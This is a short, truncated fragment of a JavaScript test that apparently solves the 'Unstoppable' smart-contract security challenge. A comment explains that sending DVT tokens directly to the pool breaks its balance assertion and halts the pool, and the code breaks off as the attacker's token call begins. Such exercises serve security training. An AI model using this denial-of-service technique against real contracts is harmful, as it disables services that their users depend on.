...
describe("[Challenge] Unstoppable", function () {
  ...
  it("Exploit", async function () {
    ...
    /**
     * To break pool you need to break this line (40): assert(poolBalance == balanceBefore);
     *
     * Sending any DVT token to the pool it will not increase the poolBalance and after that you can't assert this anymore
     */
    await this.token
      .connect(attacker)
